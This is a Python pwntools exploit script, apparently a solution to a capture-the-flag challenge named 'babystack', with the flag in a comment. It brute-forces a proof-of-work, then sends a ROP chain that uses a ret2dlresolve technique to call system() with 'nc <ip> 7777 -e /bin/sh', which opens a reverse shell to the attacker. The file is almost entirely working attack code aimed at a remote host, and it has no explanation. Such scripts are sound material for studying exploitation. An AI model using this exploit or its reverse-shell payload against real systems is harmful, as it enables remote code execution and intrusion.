#!/usr/bin/python
from pwn import *
import roputils
import sys, string
import itertools
from hashlib import sha256

LOCAL = True

HOST = "202.120.7.202"
PORT = 6666

LOCALIP = "XXX.XXX.XXX.XXX"

# flag{return_to_dlresolve_for_warming_up}
charset = string.letters+string.digits

def calcpow(chal):
    for combo in itertools.combinations_with_replacement(string.letters+string.digits,4):
        sol = ''.join(combo)        
        if sha256(chal + sol).digest().startswith("\0\0\0"):
            return sol

    return None

def get_connection():
    return remote("localhost", 6666) if LOCAL else remote(HOST, PORT)

def exploit():
    log.info("Solve pow ")

    sol = None

    while sol == None:
        r = get_connection()

        sol = calcpow(r.recvline().strip())

        if sol == None:
            r.close()            

    r.send(sol)

    pause()
    rop = roputils.ROP("./babystack")

    addr_bss = rop.section(".bss")

    log.info("Stage1: Prepare bigger read for ropchain")

    payload = "A"*40
    payload += p32(0x804a500)
    payload += p32(0x8048446)
    payload += p32(80)
    payload += "B"*(64-len(payload))

    log.info("Stage2: Send ret2dlresolve executing reverse shell")

    payload += "A"*40
    payload += p32(0x804a500)

    # Read the fake tabs from payload2 to bss
    payload += rop.call("read", 0, addr_bss, 150)    

    # Call dl_resolve with offset to our fake symbol
    payload += rop.dl_resolve_call(addr_bss+60, addr_bss)

    # Create fake rel and sym on bss
    payload2 = rop.string("nc %s 7777 -e /bin/sh" % LOCALIP)
    payload2 += rop.fill(60, payload2)
    payload2 += rop.dl_resolve_data(addr_bss+60, "system")
    payload2 += rop.fill(150, payload2)
    
    payload += payload2

    payload = payload.ljust(0x100, "\x00")

    r.sendline(payload)

    r.interactive()
    
    return

if __name__ == "__main__":
    e = ELF("./babystack")

    if len(sys.argv) > 1:
        LOCAL = False        
        exploit()
    else:
        LOCAL = True                        
        exploit()
